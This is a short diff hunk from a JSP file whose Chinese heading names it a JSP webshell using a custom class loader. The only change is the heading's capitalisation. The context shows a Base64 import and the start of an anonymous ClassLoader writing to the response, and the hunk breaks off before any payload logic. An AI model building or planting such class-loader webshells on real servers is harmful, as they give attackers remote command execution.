@@ -7,7 +7,7 @@
 <%@ page import="java.util.Base64" %>
 <html>
 <body>
-<h2>自定义类加载器的JSP Webshell</h2>
+<h2>自定义类加载器的JSP WebShell</h2>
 <%
     response.getOutputStream().write(new ClassLoader() {
 
